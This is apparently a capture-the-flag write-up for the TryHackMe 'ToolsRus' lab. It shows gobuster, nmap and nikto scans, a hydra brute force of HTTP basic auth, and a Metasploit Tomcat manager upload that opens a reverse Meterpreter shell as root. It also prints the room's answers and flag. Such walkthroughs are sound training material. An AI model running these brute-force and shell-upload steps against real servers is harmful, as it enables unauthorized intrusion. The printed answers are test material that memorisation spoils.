# ToolsRus

Practise using tools such as dirbuster, hydra, nmap, nikto and metasploit 

[ToolsRus](https://tryhackme.com/room/toolsrus)

## Topic's

* Web Enumeration
* Web Application Analysis
* Network Enumeration
* Brute Forcing HTTP-GET
* Exploiting Tomcat

## Task 1 ToysRus

Your challenge is to use the tools listed below to enumerate a server, gathering information along the way that will eventually lead to you taking over the machine.

This task requires you to use the following tools:

* Dirbuster
* Hydra
* Nmap
* Nikto
* Metasploit

1. What directory can you find, that begins with a "g"?

```
kali@kali:~/CTFs/tryhackme/ToolsRus$ gobuster dir -u 10.10.149.167 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.149.167
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/12 20:10:03 Starting gobuster
===============================================================
/guidelines (Status: 301)
/protected (Status: 401)
Progress: 13621 / 220561 (6.18%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/10/12 20:11:02 Finished
===============================================================
```

`/guidelines`

2. Whose name can you find from this directory?

[view-source:http://10.10.149.167/guidelines/](view-source:http://10.10.149.167/guidelines/)

`bob`

3. What directory has basic authentication?

[http://10.10.149.167/protected](http://10.10.149.167/protected)

`/protected`

4. What is bob's password to the protected part of the website?

```
kali@kali:~/CTFs/tryhackme/ToolsRus$ hydra -l bob -P /usr/share/wordlists/rockyou.txt -f 10.10.149.167 http-get /protected/
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-12 20:14:02
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://10.10.149.167:80/protected/
[80][http-get] host: 10.10.149.167   login: bob   password: bubbles
[STATUS] attack finished for 10.10.149.167 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-12 20:14:08
```

`bubbles`

5. What other port that serves a webs service is open on the machine?

```
kali@kali:~/CTFs/tryhackme/ToolsRus$ sudo nmap -p- -A -sS -sC -sV -O --script vuln 10.10.149.167
[sudo] password for kali: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-12 20:08 CEST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.149.167
Host is up (0.058s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:openbsd:openssh:7.2p2: 
|       CVE-2016-8858   7.8     https://vulners.com/cve/CVE-2016-8858
|       CVE-2016-6515   7.8     https://vulners.com/cve/CVE-2016-6515
|       CVE-2016-10009  7.5     https://vulners.com/cve/CVE-2016-10009
|       CVE-2016-10012  7.2     https://vulners.com/cve/CVE-2016-10012
|       CVE-2015-8325   7.2     https://vulners.com/cve/CVE-2015-8325
|       CVE-2016-10010  6.9     https://vulners.com/cve/CVE-2016-10010
|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919
|       CVE-2018-15473  5.0     https://vulners.com/cve/CVE-2018-15473
|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906
|       CVE-2016-10708  5.0     https://vulners.com/cve/CVE-2016-10708
|       CVE-2019-16905  4.4     https://vulners.com/cve/CVE-2019-16905
|       CVE-2016-6210   4.3     https://vulners.com/cve/CVE-2016-6210
|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110
|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109
|       CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685
|_      CVE-2016-10011  2.1     https://vulners.com/cve/CVE-2016-10011
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /protected/: Potentially interesting folder (401 Unauthorized)
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:apache:http_server:2.4.18: 
|       CVE-2020-11984  7.5     https://vulners.com/cve/CVE-2020-11984
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668
|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169
|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167
|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082
|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788
|       CVE-2019-10097  6.0     https://vulners.com/cve/CVE-2019-10097
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
|       CVE-2016-5387   5.1     https://vulners.com/cve/CVE-2016-5387
|       CVE-2020-9490   5.0     https://vulners.com/cve/CVE-2020-9490
|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
|       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196
|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
|       CVE-2018-17189  5.0     https://vulners.com/cve/CVE-2018-17189
|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333
|       CVE-2018-1303   5.0     https://vulners.com/cve/CVE-2018-1303
|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798
|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
|       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743
|       CVE-2016-8740   5.0     https://vulners.com/cve/CVE-2016-8740
|       CVE-2016-4979   5.0     https://vulners.com/cve/CVE-2016-4979
|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197
|       CVE-2020-11993  4.3     https://vulners.com/cve/CVE-2020-11993
|       CVE-2020-11985  4.3     https://vulners.com/cve/CVE-2020-11985
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
|       CVE-2018-1302   4.3     https://vulners.com/cve/CVE-2018-1302
|       CVE-2018-1301   4.3     https://vulners.com/cve/CVE-2018-1301
|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763
|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975
|       CVE-2016-1546   4.3     https://vulners.com/cve/CVE-2016-1546
|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
|_      CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /examples/: Sample scripts
|   /manager/html/upload: Apache Tomcat (401 Unauthorized)
|   /manager/html: Apache Tomcat (401 Unauthorized)
|_  /docs/: Potentially interesting folder
|_http-server-header: Apache-Coyote/1.1
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/12%OT=22%CT=1%CU=33726%PV=Y%DS=2%DC=T%G=Y%TM=5F849D
OS:22%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=8)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC
OS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   56.70 ms 10.8.0.1
2   56.98 ms 10.10.149.167

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 396.07 seconds
```

`1234`

6. Going to the service running on that port, what is the name and version of the software? Answer format: Full_name_of_service/Version

```
kali@kali:~/CTFs/tryhackme/ToolsRus$ curl -s http://10.10.149.167:1234/ | grep -Po "<h1>(.*)</h1>"<h1>Apache Tomcat/7.0.88</h1>
```

`Apache Tomcat/7.0.88`

7. Use Nikto with the credentials you have found and scan the /manager/html directory on the port found above. How many documentation files did Nikto identify?

```
kali@kali:~/CTFs/tryhackme/ToolsRus$ nikto -h 10.10.149.167:1234/manager/html -id "bob:bubbles"
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.149.167
+ Target Hostname:    10.10.149.167
+ Target Port:        1234/manager/html
+ Start Time:         2020-10-12 20:16:03 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-39272: /favicon.ico file identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+ Successfully authenticated to realm 'Tomcat Manager Application' with user-supplied credentials.
+ /manager/html: Tomcat Manager / Host Manager interface found (pass protected)
+ /host-manager/html: Tomcat Manager / Host Manager interface found (pass protected)
+ /manager/status: Tomcat Server Status interface found (pass protected)
+ 7892 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2020-10-12 20:22:31 (GMT2) (388 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

`5`

8. What is the server version (run the scan against port 80)?

```
kali@kali:~/CTFs/tryhackme/ToolsRus$ nikto -h 10.10.149.167- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.149.167
+ Target Hostname:    10.10.149.167
+ Target Port:        80
+ Start Time:         2020-10-12 20:21:38 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
```

`Apache/2.4.18`

9.  What version of Apache-Coyote is this service using?

```
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
```

`1.1`

10. Use Metasploit to exploit the service and get a shell on the system. What user did you get a shell as?

[https://charlesreid1.com/wiki/Metasploitable/Apache/Tomcat_and_Coyote](https://charlesreid1.com/wiki/Metasploitable/Apache/Tomcat_and_Coyote)

```
kali@kali:~/CTFs/tryhackme/ToolsRus$ msfconsole -q
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms17_010_eternalblue) > use exploit/multi/http/tomcat_mgr_upload
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf5 exploit(multi/http/tomcat_mgr_upload) > show options

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword                   no        The password for the specified username
   HttpUsername                   no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT         80               yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
   VHOST                          no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.178.52   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal


msf5 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername bob
HttpUsername => bob
msf5 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword bubbles
HttpPassword => bubbles
msf5 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.10.149.167
RHOSTS => 10.10.149.167
msf5 exploit(multi/http/tomcat_mgr_upload) > set RPORT 1234
RPORT => 1234
msf5 exploit(multi/http/tomcat_mgr_upload) > set LHOST 10.8.106.222
LHOST => 10.8.106.222
msf5 exploit(multi/http/tomcat_mgr_upload) > run

[*] Started reverse TCP handler on 10.8.106.222:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying GHeXY...
[*] Executing GHeXY...
[*] Undeploying GHeXY ...
[*] Sending stage (53944 bytes) to 10.10.149.167
[*] Meterpreter session 1 opened (10.8.106.222:4444 -> 10.10.149.167:58258) at 2020-10-12 20:28:53 +0200

meterpreter > shell
Process 1 created.
Channel 1 created.
whoami
root
```

11. What text is in the file /root/flag.txt

```
cd /root
cat flag.txt
ff1fc4a81affcc7688cf89ae7dc6e0e1
```
